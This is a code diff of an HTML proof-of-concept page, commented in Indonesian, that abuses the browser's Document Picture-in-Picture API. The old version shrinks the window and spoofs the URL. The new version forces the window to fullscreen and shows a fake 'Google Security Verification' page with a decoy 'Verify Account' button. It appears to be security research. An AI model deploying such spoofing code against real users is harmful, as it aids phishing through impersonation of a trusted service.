@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP Tiny + URL Spoofing</title>
+<title>PiP Fullscreen Force</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -18,9 +18,9 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 PiP Tiny + URL Spoofing</h2>
-  <p>Klik tombol di bawah. PiP akan diperkecil hingga title bar dan address bar terpotong, menampilkan URL palsu.</p>
-  <button id="startBtn">Open Tiny Spoofed PiP</button>
+  <h2>🔒 PiP Fullscreen Force</h2>
+  <p>Klik tombol di bawah. PiP akan dipaksa masuk fullscreen dan menutupi seluruh layar.</p>
+  <button id="startBtn">Force PiP Fullscreen</button>
   <div id="status">[*] Ready...</div>
 </div>
 
@@ -33,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Tiny Spoof] " + msg);
+    console.log("[PiP Fullscreen] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Membuka PiP...");
+    log("[*] Membuka PiP untuk fullscreen bypass...");
 
     try {
       if (!window.documentPictureInPicture) {
@@ -49,7 +49,7 @@
       }
 
       // ============================================
-      // 2. BUKA PiP (UKURAN NORMAL AWAL)
+      // 2. BUKA PiP
       // ============================================
       const pipWindow = await documentPictureInPicture.requestWindow({
         width: 400,
@@ -59,7 +59,39 @@
       log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
 
       // ============================================
-      // 3. TULIS KONTEN PiP + URL SPOOFING
+      // 3. PAKSA FULLSCREEN (MULTIPLE METODE)
+      // ============================================
+      
+      // A. Resize ke ukuran layar penuh
+      try {
+        pipWindow.resizeTo(screen.width, screen.height);
+        log('Resized to screen: ' + screen.width + 'x' + screen.height);
+      } catch (e) {
+        log('Resize error: ' + e.message);
+      }
+
+      // B. Pindahkan ke posisi 0,0
+      try {
+        pipWindow.moveTo(0, 0);
+      } catch (e) {}
+
+      // C. Request Fullscreen API (pada elemen root PiP)
+      try {
+        const root = pipWindow.document.documentElement;
+        if (root.requestFullscreen) {
+          await root.requestFullscreen();
+        } else if (root.webkitRequestFullscreen) {
+          await root.webkitRequestFullscreen();
+        } else if (root.mozRequestFullScreen) {
+          await root.mozRequestFullScreen();
+        }
+        log('Fullscreen API requested.');
+      } catch (e) {
+        log('Fullscreen API ditolak: ' + e.message);
+      }
+
+      // ============================================
+      // 4. TULIS KONTEN PiP (FULLSCREEN)
       // ============================================
       pipWindow.document.open();
       pipWindow.document.write(`
@@ -67,7 +99,7 @@
         <html>
         <head>
           <meta charset="UTF-8">
-          <title>Google Accounts</title>
+          <title>Google Security Verification</title>
           <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
@@ -80,63 +112,48 @@
               min-height: 100vh;
               padding: 20px;
               text-align: center;
+              overflow: hidden;
             }
-            h3 { font-size: 18px; color: #333; margin-bottom: 10px; }
-            p { font-size: 13px; color: #666; margin-bottom: 20px; }
-            button {
-              padding: 12px 24px;
+            h3 { font-size: 28px; color: #333; margin-bottom: 10px; }
+            p { font-size: 16px; color: #666; margin-bottom: 20px; }
+            .info {
+              font-family: monospace;
+              font-size: 14px;
+              color: #999;
+              margin-top: 20px;
+            }
+            .fake-btn {
+              padding: 15px 30px;
               background: #1a73e8;
               color: #fff;
               border: none;
-              border-radius: 6px;
-              font-size: 14px;
+              border-radius: 8px;
+              font-size: 18px;
               font-weight: bold;
               cursor: pointer;
-            }
-            button:hover { background: #1557b0; }
-            .info {
-              font-family: monospace;
-              font-size: 12px;
-              color: #999;
               margin-top: 20px;
             }
           </style>
         </head>
         <body>
-          <h3>Google Accounts</h3>
-          <p>Click the button below to shrink this window and spoof the URL.</p>
-          <button id="shrinkBtn">Shrink & Spoof</button>
-          <div class="info" id="sizeInfo">Size: 400x300</div>
+          <h3>Google Security Verification</h3>
+          <p>This PiP window is in fullscreen mode.</p>
+          <div class="info" id="sizeInfo">Size: ${pipWindow.innerWidth}x${pipWindow.innerHeight}</div>
+          <button class="fake-btn" id="fakeBtn">Verify Account</button>
 
           <script>
             (function() {
-              var shrinkBtn = document.getElementById('shrinkBtn');
               var sizeInfo = document.getElementById('sizeInfo');
-
               function updateSize() {
                 sizeInfo.textContent = 'Size: ' + window.innerWidth + 'x' + window.innerHeight;
               }
-
-              // Fungsi shrink + spoof URL
-              shrinkBtn.addEventListener('click', function() {
-                try {
-                  // 1. Spoof URL dengan subdomain panjang
-                  // Contoh: ?......................google.com
-                  var spoofedUrl = '?......................google.com';
-                  history.replaceState(null, '', spoofedUrl);
-                  
-                  // 2. Resize ke ukuran kecil (1x1 atau minimal)
-                  window.resizeTo(1, 1);
-                  
-                  updateSize();
-                } catch (err) {
-                  sizeInfo.textContent = 'Error: ' + err.message;
-                }
-              });
-
-              // Update info saat resize
               window.addEventListener('resize', updateSize);
               updateSize();
+
+              // Tombol palsu untuk memperkuat ilusi
+              document.getElementById('fakeBtn').addEventListener('click', function() {
+                alert('Verification Required. Please close this window manually.');
+              });
             })();
           <\/script>
         </body>
@@ -144,7 +161,7 @@
       `);
       pipWindow.document.close();
 
-      log('PiP ready. Click "Shrink & Spoof" inside the PiP.');
+      log('PiP fullscreen bypass attempt completed.');
 
     } catch (e) {
       log('Error: ' + e.message);
